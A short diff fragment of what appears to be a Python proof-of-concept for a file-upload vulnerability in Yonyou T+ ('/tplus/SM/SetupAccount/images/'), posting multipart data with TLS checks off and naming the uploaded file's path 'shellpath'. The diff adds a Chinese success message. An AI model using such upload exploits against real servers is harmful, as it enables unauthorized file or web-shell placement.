@@ -32,6 +32,7 @@ def upload(site):
         '------WebKitFormBoundarysHT4cEvOAWALSZEv--'
     req = requests.post(url, headers=headers, data=data,verify=False, timeout=20)
     shellpath = site + "/tplus/SM/SetupAccount/images/vulntest.txt"
+    print('[+] 上传成功！ 请查看响应包内容！路径：', shellpath)
 
 if __name__=="__main__":
     upload(sys.argv[1])
